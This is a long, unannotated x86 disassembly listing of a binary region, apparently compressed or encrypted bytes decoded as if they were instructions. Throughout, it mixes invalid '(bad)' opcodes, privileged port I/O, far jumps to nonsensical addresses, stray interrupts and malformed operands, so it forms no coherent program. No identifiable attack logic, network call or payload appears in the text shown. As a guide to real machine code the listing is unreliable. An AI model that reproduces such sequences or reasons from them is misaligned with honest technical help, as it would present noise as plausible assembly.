  420c6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c70:	xchg   ebp,eax
  420c71:	(bad)  
  420c72:	jp     0x420cc0
  420c74:	cmc    
  420c75:	stos   BYTE PTR es:[edi],al
  420c76:	ror    BYTE PTR fs:[ecx-0x14],cl
  420c7a:	shl    BYTE PTR [ebx],1
  420c7c:	xchg   edi,eax
  420c7d:	cs mov eax,0x2dd6d223
  420c83:	scas   al,BYTE PTR es:[edi]
  420c84:	push   eax
  420c85:	mov    eax,ds:0x664827ca
  420c8a:	mov    edi,0x76d6e1a9
  420c8f:	retf   0xaf91
  420c92:	or     DWORD PTR [ebx],ebx
  420c94:	inc    edx
  420c95:	inc    ebp
  420c96:	ss daa 
  420c98:	fsub   QWORD PTR [esi]
  420c9a:	lods   al,BYTE PTR ds:[esi]
  420c9b:	jb     0x420cb6
  420c9d:	mov    ebp,0x2e201ddf
  420ca2:	sub    eax,0x3491b5ef
  420ca7:	push   edi
  420ca8:	loopne 0x420d06
  420caa:	ss jno 0x420c3a
  420cad:	inc    ebx
  420cae:	dec    esp
  420caf:	push   0xde284b24
  420cb4:	mov    BYTE PTR [edi],0x2f
  420cb7:	xor    al,BYTE PTR [ebp-0x1140b1b7]
  420cbd:	(bad)  
  420cbf:	gs repnz cwde 
  420cc2:	aas    
  420cc3:	dec    esp
  420cc4:	cmp    al,0x14
  420cc6:	pop    ebx
  420cc7:	icebp  
  420cc8:	add    eax,0x256cf2f
  420ccd:	jecxz  0x420d1e
  420ccf:	call   0x9211:0x63762aee
  420cd6:	cli    
  420cd7:	stos   DWORD PTR es:[edi],eax
  420cd8:	imul   ebx,DWORD PTR [ecx+esi*4-0x6b64f2f2],0xffffff8c
  420ce0:	test   eax,0x511fee67
  420ce5:	fwait
  420ce6:	push   ds
  420ce7:	mov    eax,ds:0x1b61fcec
  420cec:	pop    ebp
  420ced:	push   0xc9f698db
  420cf2:	inc    esp
  420cf3:	loopne 0x420d11
  420cf5:	dec    edi
  420cf6:	xor    eax,0xfcff1406
  420cfb:	push   ss
  420cfc:	adc    dh,0xac
  420cff:	and    ebp,DWORD PTR [ebx-0x72]
  420d02:	and    esp,ebx
  420d04:	or     DWORD PTR [eax],ebx
  420d06:	and    al,0x9f
  420d08:	fucomi st,st(1)
  420d0a:	rol    BYTE PTR [edi-0x775253a0],cl
  420d10:	xor    BYTE PTR [edi],al
  420d12:	mov    BYTE PTR ds:0xfa4d51d6,ch
  420d18:	daa    
  420d19:	push   0xfffffff3
  420d1b:	lea    ebx,[ebp+ebx*8-0x3a]
  420d1f:	jmp    0x632a997c
  420d24:	int3   
  420d25:	adc    DWORD PTR [edx-0x22],ebx
  420d28:	outs   dx,DWORD PTR ds:[esi]
  420d29:	cmp    dh,BYTE PTR [ecx+esi*1+0x7e]
  420d2d:	daa    
  420d2e:	ror    DWORD PTR [ecx],1
  420d30:	or     eax,0x3ef49eda
  420d35:	xor    DWORD PTR [esi],esi
  420d37:	jp     0x420cde
  420d39:	cmp    ebx,ebp
  420d3b:	mov    ebx,0xc91ebb1
  420d40:	sub    DWORD PTR [ecx-0x7b],esp
  420d43:	(bad)  
  420d45:	push   edi
  420d46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d47:	fild   WORD PTR [ebp-0x50ad0852]
  420d4d:	je     0x420d7e
  420d4f:	and    al,0xb8
  420d51:	test   DWORD PTR [ebp-0x1b],0x724eaa13
  420d58:	xchg   edx,eax
  420d59:	addr16 cld 
  420d5b:	xchg   edi,edx
  420d5d:	push   0x449e6703
  420d62:	inc    esi
  420d63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d64:	adc    eax,0x778344fe
  420d69:	jbe    0x420d46
  420d6b:	sub    eax,0x47fcdc2d
  420d70:	inc    eax
  420d71:	inc    eax
  420d72:	test   BYTE PTR [esp+edi*8+0x28],ch
  420d76:	mov    ds:0x7ee28c76,al
  420d7b:	into   
  420d7c:	lahf   
  420d7d:	out    0xc6,eax
  420d7f:	mov    ds:0x3de4bfa1,eax
  420d84:	and    al,dh
  420d86:	and    esi,edx
  420d88:	aam    0xfc
  420d8a:	pop    ebx
  420d8b:	xchg   esp,eax
  420d8c:	loope  0x420d2e
  420d8e:	addr16 pop ecx
  420d90:	mov    edx,0x15cf5fef
  420d95:	das    
  420d96:	imul   ecx,DWORD PTR [ecx+0x47],0xc3b11d41
  420d9d:	mov    al,ds:0xd7384e31
  420da2:	mov    ds:0x70213d83,al
  420da7:	sbb    al,0xe5
  420da9:	xchg   edx,eax
  420daa:	lds    esp,FWORD PTR [ecx]
  420dac:	aam    0x68
  420dae:	jecxz  0x420d45
  420db0:	pushf  
  420db1:	test   eax,0x5beaf13b
  420db6:	into   
  420db7:	xchg   esi,ebp
  420db9:	in     al,0x21
  420dbb:	imul   eax,DWORD PTR [esi],0xffffffb6
  420dbe:	sub    al,0xd0
  420dc0:	push   edx
  420dc1:	out    0xb0,al
  420dc3:	jne    0x420df1
  420dc5:	ins    BYTE PTR es:[edi],dx
  420dc6:	div    BYTE PTR [ebp-0x684039ea]
  420dcc:	fist   WORD PTR [ebp+0x2982409e]
  420dd2:	mov    bl,0x54
  420dd4:	aad    0x51
  420dd6:	pushf  
  420dd7:	sbb    ebx,DWORD PTR [edx+ecx*2]
  420dda:	icebp  
  420ddb:	stos   BYTE PTR es:[edi],al
  420ddc:	mov    al,ds:0x8131c7a3
  420de1:	or     BYTE PTR [edx],bh
  420de3:	sbb    ebx,DWORD PTR [ecx+ebx*2+0x172e46cf]
  420dea:	ja     0x420e23
  420dec:	repnz dec esi
  420dee:	sub    BYTE PTR [esi],bl
  420df0:	cmp    ah,dl
  420df2:	lods   al,BYTE PTR ds:[esi]
  420df3:	shl    DWORD PTR [edi+0x32],1
  420df6:	push   esi
  420df7:	mov    bl,0x59
  420df9:	scas   al,BYTE PTR es:[edi]
  420dfa:	sbb    DWORD PTR [ebx-0x7a],esp
  420dfd:	cli    
  420dfe:	pop    edx
  420dff:	out    0xe1,eax
  420e01:	dec    ebx
  420e02:	pop    es
  420e03:	int    0x4
  420e05:	cmp    al,0x37
  420e07:	ins    DWORD PTR es:[edi],dx
  420e08:	enter  0xa8fd,0x64
  420e0c:	ss out dx,al
  420e0e:	jb     0x420e60
  420e10:	xchg   BYTE PTR [esi],ch
  420e12:	hlt    
  420e13:	mov    eax,ds:0x7002923
  420e18:	in     al,dx
  420e19:	pop    es
  420e1a:	icebp  
  420e1b:	xchg   ebx,eax
  420e1c:	cld    
  420e1d:	cmp    dh,al
  420e1f:	inc    ecx
  420e20:	add    ch,dl
  420e22:	ds inc eax
  420e24:	xchg   edi,eax
  420e25:	push   0x7f
  420e27:	pop    eax
  420e28:	jb     0x420ea3
  420e2a:	enter  0xbd2c,0x97
  420e2e:	frstor [edx+0x159171ad]
  420e34:	aam    0x1
  420e36:	mov    esp,0x77ca82b
  420e3b:	arpl   WORD PTR [eax-0x76595708],bp
  420e41:	es iret 
  420e43:	jno    0x420ec0
  420e45:	(bad)  
  420e46:	jmp    0x420e5b
  420e48:	popw   es
  420e4a:	sbb    BYTE PTR [esi+0x1e12031a],dh
  420e50:	dec    ebp
  420e51:	out    dx,eax
  420e52:	fiadd  WORD PTR [esi]
  420e54:	ficomp WORD PTR ds:0x141d1ea0
  420e5a:	stos   BYTE PTR es:[edi],al
  420e5b:	out    dx,eax
  420e5c:	xor    DWORD PTR [ecx-0x7cae3d46],0x15
  420e63:	fidivr WORD PTR [edi-0x2f2f80f3]
  420e69:	test   DWORD PTR [eax-0x547ea080],ebx
  420e6f:	push   esp
  420e70:	(bad)  
  420e71:	mov    eax,0x3afc9ac3
  420e76:	pop    es
  420e77:	rep ins BYTE PTR es:[edi],dx
  420e79:	mov    esi,ecx
  420e7b:	mov    cl,0x98
  420e7d:	and    dh,BYTE PTR [ecx+eax*1-0x3bf62a68]
  420e84:	(bad)  
  420e85:	shr    ch,1
  420e87:	mov    bl,0xfb
  420e89:	mov    cl,0x55
  420e8b:	xchg   ebp,eax
  420e8c:	xchg   esp,eax
  420e8d:	or     dl,BYTE PTR [esi+edi*4]
  420e90:	ins    DWORD PTR es:[edi],dx
  420e91:	pop    DWORD PTR [edx+ecx*2]
  420e94:	repnz mov ch,0x41
  420e97:	pop    edx
  420e98:	inc    ebx
  420e99:	cmp    bl,BYTE PTR [ecx+0x65abf939]
  420e9f:	mov    dl,0x11
  420ea1:	xchg   ebp,eax
  420ea2:	pop    esp
  420ea3:	jne    0x420ef8
  420ea5:	push   esi
  420ea6:	mov    BYTE PTR [esi+0x20],dl
  420ea9:	outs   dx,BYTE PTR es:[esi]
  420eab:	iret   
  420eac:	lahf   
  420ead:	sbb    edx,DWORD PTR [ecx]
  420eaf:	ror    DWORD PTR [esi+0x5a7e0ba1],0x68
  420eb6:	and    al,0xff
  420eb8:	fist   WORD PTR [esi-0x3f]
  420ebb:	inc    esi
  420ebc:	aam    0x76
  420ebe:	xor    DWORD PTR [edx+0x37],ebx
  420ec1:	xchg   edx,eax
  420ec2:	icebp  
  420ec3:	out    0xb0,al
  420ec5:	xchg   ebx,eax
  420ec6:	fsubr  DWORD PTR [eax+0x14]
  420ec9:	jne    0x420e94
  420ecb:	cmp    eax,0x7f9bb39b
  420ed0:	fs adc eax,ecx
  420ed3:	test   DWORD PTR es:[edx+0x771fa17f],esp
  420eda:	daa    
  420edb:	mov    ebx,esi
  420edd:	bound  ebx,QWORD PTR [esi+0x5c2bd208]
  420ee3:	xor    eax,0x6b8e3c7
  420ee8:	scas   eax,DWORD PTR es:[edi]
  420ee9:	(bad)  
  420eea:	rol    DWORD PTR [eax+0x7],0x1d
  420eee:	pop    ebp
  420eef:	jge    0x420eb9
  420ef1:	mov    edx,0xc22408ab
  420ef6:	repz inc edi
  420ef8:	(bad)  
  420ef9:	mov    ebp,0x8c5f240c
  420efe:	scas   eax,DWORD PTR es:[edi]
  420eff:	retf   
  420f00:	sub    BYTE PTR [esi],al
  420f02:	xchg   edi,eax
  420f03:	hlt    
  420f04:	fwait
  420f05:	jb     0x420f3e
  420f07:	lods   eax,DWORD PTR ds:[esi]
  420f08:	in     al,0xe5
  420f0a:	xchg   esi,esi
  420f0c:	fdivr  QWORD PTR [ebx+0xa0b4603]
  420f12:	cmp    BYTE PTR [eax+ecx*4+0x2],cl
  420f16:	xor    DWORD PTR [ebx+0x1f],ecx
  420f19:	lods   al,BYTE PTR ds:[esi]
  420f1a:	inc    edi
  420f1b:	cs (bad) 
  420f1d:	add    al,BYTE PTR [esi-0x115ff117]
  420f23:	mov    ebp,0x5165c68d
  420f28:	pop    ds
  420f29:	das    
  420f2a:	inc    edx
  420f2b:	mov    dh,0x48
  420f2d:	sbb    DWORD PTR [edx+0x1cdc0f81],ebx
  420f33:	jns    0x420efd
  420f35:	test   al,0x1f
  420f37:	or     BYTE PTR [edx],ch
  420f39:	add    DWORD PTR [eax],0xac5407da
  420f3f:	out    0x73,eax
  420f41:	(bad)  
  420f43:	outs   dx,BYTE PTR ds:[esi]
  420f44:	fs sahf 
  420f46:	or     ah,bh
  420f48:	xor    DWORD PTR [ebx],ecx
  420f4a:	loop   0x420f6a
  420f4c:	push   ebx
  420f4d:	popf   
  420f4e:	and    al,0xc7
  420f50:	bts    DWORD PTR [edx-0x3d],0xb4
  420f55:	and    esp,DWORD PTR [ecx-0x23d72865]
  420f5b:	add    BYTE PTR [edi+0x25],cl
  420f5e:	rol    ch,1
  420f60:	jb     0x420f0c
  420f62:	xchg   esi,eax
  420f63:	retf   0xf953
  420f66:	mov    bl,0x49
  420f68:	jo     0x420f15
  420f6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f6b:	call   0xc28b161a
  420f70:	inc    ecx
  420f71:	popf   
  420f72:	push   cs
  420f73:	scas   al,BYTE PTR es:[edi]
  420f74:	jae    0x420f99
  420f76:	leave  
  420f77:	mov    ?,WORD PTR [ebx]
  420f79:	xchg   ebp,eax
  420f7a:	jno    0x420f53
  420f7c:	mov    BYTE PTR [esp+ebp*1],cl
  420f7f:	shr    BYTE PTR [ecx],1
  420f81:	call   0x88548694
  420f86:	(bad)  
  420f87:	cld    
  420f88:	pop    edi
  420f89:	jo     0x420f91
  420f8b:	or     eax,DWORD PTR [ecx+0x55c2cf66]
  420f91:	adc    al,0x41
  420f93:	rcl    BYTE PTR [ecx+0x135da6b3],1
  420f99:	xor    cl,bh
  420f9b:	imul   ebp,DWORD PTR [ecx+0x25],0x3b
  420f9f:	dec    esi
  420fa0:	daa    
  420fa1:	in     eax,0x95
  420fa3:	shl    BYTE PTR ds:0x16c0,cl
  420fa8:	inc    ebp
  420fa9:	or     al,0xeb
  420fab:	or     DWORD PTR [ebx-0xf3925eb],edi
  420fb1:	mov    BYTE PTR [eax-0x15],bl
  420fb4:	sbb    DWORD PTR [edx+0x1d243cd4],edx
  420fba:	add    DWORD PTR [ecx-0x2d9db858],0x22
  420fc1:	int3   
  420fc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420fc3:	ficom  WORD PTR [edi]
  420fc5:	sbb    al,0x19
  420fc7:	test   eax,ebx
  420fc9:	jb     0x420f83
  420fcb:	sbb    al,0x95
  420fcd:	out    dx,al
  420fce:	sbb    edi,DWORD PTR [edi]
  420fd0:	or     DWORD PTR [ebx+0x69],esi
  420fd3:	sbb    ebp,ebp
  420fd5:	lods   eax,DWORD PTR ds:[esi]
  420fd6:	fimul  WORD PTR [ecx-0x1a31dd1e]
  420fdc:	jp     0x420fec
  420fde:	jp     0x421015
  420fe0:	sub    dh,BYTE PTR [edx]
  420fe2:	pop    ebx
  420fe3:	test   eax,0xd8b38b99
  420fe8:	mov    WORD PTR [esi],es
  420fea:	push   cs
  420feb:	fwait
  420fec:	icebp  
  420fed:	imul   eax,edi,0x9a30b9dd
  420ff3:	adc    edx,DWORD PTR [edx-0x6a]
  420ff6:	sub    al,0x46
  420ff8:	add    dl,BYTE PTR [ebx+0x5b]
  420ffb:	hlt    
  420ffc:	jne    0x42105a
  420ffe:	xchg   ebp,eax
  420fff:	std    
  421000:	and    al,0xd8
  421002:	shl    DWORD PTR ds:0xd27b1610,cl
  421008:	and    BYTE PTR [edx+0x614464b3],dh
  42100e:	lods   al,BYTE PTR ds:[esi]
  42100f:	popf   
  421010:	xor    al,0x8a
  421012:	sub    bh,cl
  421014:	mov    WORD PTR [esi],gs
  421016:	pop    ss
  421017:	and    DWORD PTR [edi+0x23],ebx
  42101a:	retf   
  42101b:	inc    ecx
  42101c:	stos   DWORD PTR es:[edi],eax
  42101d:	and    ecx,DWORD PTR [ebx+esi*2-0x4b]
  421021:	xchg   ecx,eax
  421022:	dec    esp
  421023:	xchg   BYTE PTR [eax],al
  421025:	sub    eax,0xda68755e
  42102a:	(bad)  
  42102b:	mov    eax,0xe5b3f389
  421030:	test   BYTE PTR [edi],dh
  421032:	sbb    BYTE PTR ss:[ebp-0x3e],0xab
  421037:	in     al,dx
  421038:	addr16 dec eax
  42103a:	push   esi
  42103b:	sbb    BYTE PTR ds:0x606cbf3f,0x32
  421042:	mov    al,0x18
  421044:	enter  0x9b6f,0x8d
  421048:	sub    eax,0xb8ed6e4
  42104d:	jmp    0xc5b:0x9e4c8a23
  421054:	out    dx,eax
  421055:	mov    cl,0x70
  421057:	aaa    
  421058:	xor    al,0xa4
  42105a:	xchg   ebx,eax
  42105b:	(bad)  
  42105c:	neg    ecx
  42105e:	stc    
  42105f:	dec    eax
  421060:	sbb    al,BYTE PTR [ecx+0x46]
  421063:	adc    bl,BYTE PTR [ebx+ebp*1+0x6e166bb2]
  42106a:	push   ss
  42106b:	aaa    
  42106c:	add    bh,BYTE PTR ds:0xc65f7130
  421072:	int    0x34
  421074:	cwde   
  421075:	aad    0x4e
  421077:	int    0x1a
  421079:	inc    ebp
  42107a:	or     eax,DWORD PTR [edx+0x2c716f32]
  421080:	pop    esp
  421081:	ja     0x4210b4
  421083:	jbe    0x421036
  421085:	xor    BYTE PTR [esi],al
  421087:	sub    ebx,DWORD PTR [esi-0x450754e]
  42108d:	xchg   ebx,eax
  42108e:	jns    0x4210d6
  421090:	and    DWORD PTR [edx-0x443cc17c],ecx
  421096:	sbb    DWORD PTR [esi+0x4d],eax
  421099:	into   
  42109a:	or     ebx,DWORD PTR [edi+0x74]
  42109d:	scas   al,BYTE PTR es:[edi]
  42109e:	(bad)  
  42109f:	out    dx,eax
  4210a0:	(bad)  
  4210a1:	inc    ebx
  4210a2:	fdivr  DWORD PTR [eax]
  4210a4:	mov    ebp,0x4a9539f8
  4210a9:	clc    
  4210aa:	xchg   ebp,eax
  4210ab:	not    DWORD PTR [edx-0x3e]
  4210ae:	js     0x42106b
  4210b0:	mov    esi,0xadcc4690
  4210b5:	mov    bl,ch
  4210b7:	mov    eax,0xec769e0d
  4210bc:	fwait
  4210bd:	xor    al,0xce
  4210bf:	mov    edi,0x98eaf8f7
  4210c4:	in     eax,dx
  4210c5:	stos   BYTE PTR es:[edi],al
  4210c6:	cmp    cl,BYTE PTR ds:0x353deea8
  4210cc:	outs   dx,BYTE PTR ds:[esi]
  4210cd:	inc    edi
  4210ce:	inc    esi
  4210cf:	jmp    FWORD PTR [edx]
  4210d1:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  4210d3:	xbegin 0xa0306642
  4210d9:	jbe    0x42112c
  4210db:	add    DWORD PTR [edi],ecx
  4210dd:	(bad)  
  4210de:	repz add esp,DWORD PTR ds:0x119d2fcb
  4210e5:	push   esi
  4210e6:	int    0xaf
  4210e8:	mov    eax,ds:0x655051ce
  4210ed:	pop    ss
  4210ee:	adc    eax,0xa5c51c21
  4210f3:	nop
  4210f4:	or     al,0x3b
  4210f6:	ret    0x8985
  4210f9:	push   eax
  4210fa:	cmovae esi,DWORD PTR [esi+0x34]
  4210fe:	leave  
  4210ff:	stc    
  421100:	xor    bh,dl
  421102:	xor    al,0xf5
  421104:	scas   eax,DWORD PTR es:[edi]
  421105:	push   ebp
  421106:	sbb    edx,ecx
  421108:	sub    eax,0x8cceea19
  42110d:	int    0x3a
  42110f:	xchg   ecx,eax
  421110:	in     eax,dx
  421111:	mov    dl,0xca
  421113:	mov    eax,0x6fc482b4
  421118:	addr16 test eax,0x1f39fd42
  42111e:	jecxz  0x421191
  421120:	loop   0x4210b9
  421122:	xchg   esi,ebx
  421124:	inc    edx
  421125:	push   ebx
  421126:	jbe    0x421161
  421128:	fs loope 0x421155
  42112b:	mov    ds:0x1b7abc56,al
  421130:	cmp    bl,0xad
  421133:	jecxz  0x42117b
  421135:	pop    esp
  421136:	pushf  
  421137:	test   al,0x70
  421139:	ins    BYTE PTR es:[edi],dx
  42113a:	mov    dh,0x2e
  42113c:	and    ebp,ebx
  42113e:	test   ebx,edi
  421140:	retf   
  421141:	cli    
  421142:	mov    edi,0xde396a3
  421147:	test   DWORD PTR [eax+0x2194f14],esi
  42114d:	cli    
  42114e:	hlt    
  42114f:	push   edx
  421150:	or     DWORD PTR [ecx-0x3a661f78],0x60
  421157:	iret   
  421158:	shr    BYTE PTR [edx-0x119d69b],1
  42115e:	push   esi
  42115f:	add    al,0xfa
  421161:	inc    edi
  421162:	cmp    BYTE PTR [ecx],dh
  421164:	cs ss adc ax,0x66c8
  42116a:	sti    
  42116b:	fbstp  TBYTE PTR [ebx+0x74385251]
  421171:	jae    0x421103
  421173:	jmp    0x98b:0xf377c276
  42117a:	fsub   st,st(7)
  42117c:	inc    esi
  42117d:	jg     0x421148
  42117f:	xchg   ebp,eax
  421180:	mov    es,WORD PTR [ebx+0x57]
  421183:	add    al,0xf8
  421185:	mov    bh,0x56
  421187:	inc    ecx
  421188:	xchg   BYTE PTR [ebx+0x7a507375],al
  42118e:	arpl   sp,bx
  421190:	aaa    
  421191:	jmp    0xca375cdd
  421196:	or     ebx,DWORD PTR [edx+eiz*2+0x5c]
  42119a:	mov    edx,0xe40485f8
  42119f:	scas   eax,DWORD PTR es:[edi]
  4211a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211a1:	pop    eax
  4211a2:	in     eax,dx
  4211a3:	sub    ecx,eax
  4211a5:	popf   
  4211a6:	std    
  4211a7:	sahf   
  4211a8:	adc    BYTE PTR [esi+eax*2+0x536b246c],ch
  4211af:	lods   eax,DWORD PTR ds:[esi]
  4211b0:	fmul   st,st(5)
  4211b2:	outs   dx,BYTE PTR ds:[esi]
  4211b3:	and    al,0x7a
  4211b5:	stc    
  4211b6:	out    0x41,al
  4211b8:	pop    ss
  4211b9:	sub    edi,DWORD PTR fs:0x1dac6c4
  4211c0:	mov    ebp,db4
  4211c3:	or     bl,BYTE PTR [eax-0x70]
  4211c6:	out    dx,al
  4211c7:	repnz push ds
  4211c9:	ins    DWORD PTR es:[edi],dx
  4211ca:	pop    esp
  4211cb:	int3   
  4211cc:	fwait
  4211cd:	int3   
  4211ce:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4211d0:	xor    BYTE PTR [ebp-0x23169b9e],bh
  4211d6:	dec    ebp
  4211d7:	xchg   ebx,eax
  4211d8:	dec    ebp
  4211d9:	test   BYTE PTR [esp+edx*1+0x2652016b],dl
  4211e0:	popa   
  4211e1:	sbb    al,0x1a
  4211e3:	ror    ecx,cl
  4211e5:	push   ds
  4211e6:	xchg   esi,eax
  4211e7:	inc    edx
  4211e8:	cmc    
  4211e9:	shl    BYTE PTR [esi-0x1fcb783],0x15
  4211f0:	jbe    0x4211d2
  4211f2:	(bad)  
  4211f3:	mov    ds:0x92eb010e,al
  4211f8:	mov    ecx,DWORD PTR ds:0xab6bccba
  4211fe:	aam    0x8d
  421200:	inc    edx
  421201:	add    edi,DWORD PTR [edi]
  421203:	pop    ds
  421204:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421205:	jle    0x4211f0
  421207:	or     BYTE PTR [ebx+0x77],cl
  42120a:	sub    ebx,DWORD PTR [edi+0x4ed697d8]
  421210:	cmp    cl,cl
  421212:	pop    edi
  421213:	mov    ebp,ebx
  421215:	in     al,dx
  421216:	shl    DWORD PTR [esi+0x2f2a89b4],cl
  42121c:	jo     0x4211be
  42121e:	fmul   DWORD PTR [edx]
  421220:	lock ss in eax,0xfb
  421224:	sar    BYTE PTR ds:0xf039fce4,cl
  42122a:	(bad)  
  42122b:	cli    
  42122c:	data16 mov ch,dl
  42122f:	dec    ecx
  421230:	ins    BYTE PTR es:[edi],dx
  421231:	xchg   ecx,eax
  421232:	lds    ecx,FWORD PTR [esi+0x6cd39569]
  421238:	mov    eax,ds:0xe3571c7f
  42123d:	adc    ebp,esi
  42123f:	mov    eax,0xa76b79dc
  421244:	push   ebx
  421245:	loop   0x421228
  421247:	jle    0x421234
  421249:	fwait
  42124a:	pop    eax
  42124b:	mov    ds:0x7414ae9b,al
  421250:	jmp    0xa414:0xf64777b1
  421257:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421258:	idiv   ebp
  42125a:	mov    esp,0xf29bf9ae
  42125f:	dec    ebp
  421260:	mov    eax,0x55ef8010
  421265:	lods   eax,DWORD PTR ds:[esi]
  421266:	mov    ebp,0x9678044b
  42126b:	mov    al,ds:0xf79955ed
  421270:	retf   0xaa2c
  421273:	xor    DWORD PTR [esp+eax*8-0x1c290a09],0xffffffe1
  42127b:	pop    ds
  42127c:	mov    cl,dh
  42127e:	stos   DWORD PTR es:[edi],eax
  42127f:	dec    edx
  421280:	pop    edx
  421281:	sbb    BYTE PTR [edx+0x47],bl
  421284:	xor    DWORD PTR [eax-0x4],ebp
  421287:	push   ebp
  421288:	mov    dl,0x44
  42128a:	mov    ss,ebp
  42128c:	pop    ds
  42128d:	pop    edx
  42128e:	test   eax,0x26765627
  421293:	pop    DWORD PTR ds:0x6b52ac8d
  421299:	ret    
  42129a:	mov    WORD PTR [edx-0x38],?
  42129d:	dec    edi
  42129e:	or     al,0x8
  4212a0:	mov    ebx,0x3ff7ef03
  4212a5:	std    
  4212a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212a7:	cmp    DWORD PTR [esi+0x67],eax
  4212aa:	and    esi,DWORD PTR [ecx+0xd]
  4212ad:	add    ebx,DWORD PTR [ecx-0x46]
  4212b0:	out    0x9d,al
  4212b2:	xlat   BYTE PTR ds:[ebx]
  4212b3:	push   cx
  4212b5:	sbb    al,0x38
  4212b7:	xor    ecx,DWORD PTR [esi+0x73b75c43]
  4212bd:	pop    esp
  4212be:	jmp    DWORD PTR [edx+0x51]
  4212c1:	pop    ds
  4212c2:	ds imul edi,esp,0x4b
  4212c6:	(bad)  
  4212c7:	push   edx
  4212c8:	pop    ecx
  4212c9:	in     eax,0x39
  4212cb:	(bad)  
  4212cc:	push   ecx
  4212cd:	(bad)  
  4212ce:	mov    ah,0x30
  4212d0:	cs out dx,al
  4212d2:	push   cs
  4212d3:	cmp    eax,0xc8bd098d
  4212d8:	xchg   ecx,eax
  4212d9:	mov    ecx,0x5ad35386
  4212de:	pop    ebp
  4212df:	cmp    BYTE PTR [edi],0x8a
  4212e2:	les    ebx,FWORD PTR [edx+0x7b5100d4]
  4212e8:	mov    ah,0x35
  4212ea:	inc    edi
  4212eb:	loopne 0x421333
  4212ed:	sbb    BYTE PTR [edx],bh
  4212ef:	adc    al,0xfc
  4212f1:	and    ch,al
  4212f3:	aaa    
  4212f4:	adc    al,dh
  4212f6:	adc    edx,DWORD PTR [esi+ebp*8+0x1e]
  4212fa:	loopne 0x42132a
  4212fc:	push   edx
  4212fd:	sbb    DWORD PTR [edi+0xf],edx
  421300:	sbb    edx,edi
  421302:	dec    esi
  421303:	or     ecx,DWORD PTR ds:0x8a0f0055
  421309:	jns    0x4212d4
  42130b:	lahf   
  42130c:	push   ds
  42130d:	leave  
  42130e:	loopne 0x4212a8
  421310:	test   BYTE PTR [edx],al
  421312:	or     BYTE PTR [edx-0x41d456be],0x6e
  421319:	ss js  0x4212df
  42131c:	mov    esp,0x928e4f18
  421321:	jp     0x4212cd
  421323:	inc    edi
  421324:	fcom   QWORD PTR [ebp+ebp*2-0x35]
  421328:	pushf  
  421329:	cdq    
  42132a:	pop    ebx
  42132b:	adc    BYTE PTR [esi+eax*1+0x6cff7108],0xdb
  421333:	mov    ebx,0xefa08ca3
  421338:	(bad)  
  421339:	shr    edx,cl
  42133b:	aam    0xc8
  42133d:	sub    eax,0xaba15df5
  421342:	shl    DWORD PTR [esp+esi*4],cl
  421345:	mov    ecx,0x67eeba6
  42134a:	mov    esi,0x4b50c59d
  42134f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421350:	ins    BYTE PTR es:[edi],dx
  421351:	imul   edi,DWORD PTR [ebp-0x79],0xdb55549d
  421358:	inc    eax
  421359:	mov    esp,DWORD PTR [ebp-0x33c8b1ae]
  42135f:	vshufpd ymm5,ymm3,YMMWORD PTR [esp+ebp*4+0x112bc6e],0x81
  421369:	mov    ecx,esi
  42136b:	in     al,0x38
  42136d:	inc    esi
  42136e:	xor    DWORD PTR [eax+0x76bc8ff6],eax
  421374:	sub    DWORD PTR [ecx+0x27],ebx
  421377:	mov    ebx,DWORD PTR [ebx]
  421379:	push   cs
  42137a:	lock test al,0xe4
  42137d:	and    ebp,DWORD PTR [esi+0x69f3611f]
  421383:	(bad)  
  421384:	mov    edx,0x9d036ed3
  421389:	lods   al,BYTE PTR ds:[esi]
  42138a:	pop    ecx
  42138b:	xor    al,BYTE PTR [ecx+0x66]
  42138e:	xor    BYTE PTR [edi-0x5],cl
  421391:	enter  0x4721,0x15
  421395:	out    0x98,eax
  421397:	sub    edi,DWORD PTR [ecx-0x5b2303fe]
  42139d:	mov    ds:0x16cf949b,eax
  4213a2:	adc    cl,BYTE PTR [edi]
  4213a4:	adc    BYTE PTR [ebp-0x5e],cl
  4213a7:	test   al,0xd7
  4213a9:	data16 adc BYTE PTR [eax+edi*2+0x7546a9bc],ah
  4213b1:	call   0x16d6d2ae
  4213b6:	pop    edx
  4213b7:	sub    BYTE PTR [ebx+0x1f34a477],bh
  4213bd:	mov    cl,0x52
  4213bf:	fld    DWORD PTR [eax-0x3aaf87ac]
  4213c5:	(bad)  
  4213c6:	sbb    eax,0x405c5b32
  4213cb:	and    BYTE PTR [ebx-0x41],dl
  4213ce:	nop
  4213cf:	ja     0x42137c
  4213d1:	loope  0x421363
  4213d3:	mov    WORD PTR [ecx+esi*4-0x5e873458],es
  4213da:	scas   eax,DWORD PTR es:[edi]
  4213db:	mov    ah,0x4f
  4213dd:	mov    ch,0x7e
  4213df:	retf   
  4213e0:	arpl   WORD PTR [edx+0x14e8267a],bx
  4213e6:	add    edx,DWORD PTR [esi-0x80]
  4213e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213ea:	mov    dl,0xd9
  4213ec:	cdq    
  4213ed:	sbb    al,bl
  4213ef:	jecxz  0x4213ce
  4213f1:	mov    ds:0x57a0cac,al
  4213f6:	adc    BYTE PTR [edi],dl
  4213f8:	std    
  4213f9:	and    eax,0xc717a3d
  4213fe:	in     eax,0x89
  421400:	adc    al,0x7c
  421402:	inc    eax
  421403:	cwde   
  421404:	xor    dh,cl
  421406:	sahf   
  421407:	cmp    DWORD PTR [edx-0x2b],esi
  42140a:	test   al,0x6f
  42140c:	cwde   
  42140d:	data16 mul dh
  421410:	(bad)
  421413:	mov    bl,0x7b
  421415:	daa    
  421416:	in     al,0x12
  421418:	add    al,0x51
  42141b:	adc    eax,0x2885cd12
  421420:	mov    ch,0xfa
  421422:	cbw    
  421424:	in     al,dx
  421425:	mov    dl,0x14
  421427:	in     al,0xec
  421429:	jl     0x421451
  42142b:	dec    edi
  42142c:	and    DWORD PTR [edi+0x4666feae],ecx
